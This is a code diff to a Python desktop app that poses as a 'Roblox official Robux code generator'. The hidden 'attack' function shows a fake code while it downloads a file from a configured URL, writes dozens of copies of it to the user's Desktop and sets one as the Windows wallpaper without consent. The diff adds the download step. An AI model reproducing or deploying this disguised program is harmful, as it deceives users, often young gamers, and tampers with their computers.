@@ -1,18 +1,13 @@
 import os
-from os import path, walk
-import ctypes
-from tkinter import Tk
-from tkinter.ttk import *
+from os import path
+from tkinter import *
 from PIL import Image, ImageTk
-import shutil
 import platform
-import yaml
 import random
-import config as c
+import backend.config as c
+import backend.paths as paths
 
 # ! WORKS ONLY IN THE WINDOWS
-
-systemName = platform.system().lower()
 
 window = Tk()
 window.title("ROBLOX OFFICIAL ROBUX CODE GENERATOR 🤑🤑🤑🤑")
@@ -27,31 +22,41 @@ getrobuxnow.pack(pady=15)
 code = Label(window, text="Output: Nothing 😭")
 code.pack(padx=15,pady=10)
 
-bobuximg = ImageTk.PhotoImage(Image.open("res/img/bobux.png"))
+bobuximg = ImageTk.PhotoImage(Image.open(paths.img("bobux")))
 robux = Label(image=bobuximg)
 robux.pack()
 
-def generateFakeCode():
-    fakecode:str = ""
-    chars = yaml.safe_load(open("res/chars.yaml"))["chars"]
+try:
+    import requests
 
+    checkintenet = requests.get("https://www.google.com")
+    response = requests.get(c.url, stream=True)
+    hasinternet = True
+except Exception as e:
+    hasinternet = False
+
+def generateFakeCode():
+    fakecode = ""
+    
+    import yaml
+    chars = yaml.safe_load(open(paths.yaml("chars")))["chars"]
     for i in range(random.randint(10, 20)):
         fakecode += random.choice(chars)  
-
     code.config(text="Output: "+fakecode)
-
-abs = path.abspath(c.complete)
 
 def attack():
     generateFakeCode()
 
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, abs, 0)
-    for i in range(random.randint(200, 400)):
-        shutil.copy(abs, path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(i)))
+    for i in range(random.randint(50, 125)):
+        with open(path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(i)), 'wb') as f:
+            f.write(response.content)
 
-if systemName != "windows":
+    import ctypes
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(0)), 0)   
+
+if platform.system().lower() != "windows" or not hasinternet:
     getrobuxnow.config(command=generateFakeCode)
-    print('Operating System not supported!')
+    print('Operating System not supported or is without internet!')
 else:
     getrobuxnow.config(command=attack)
 
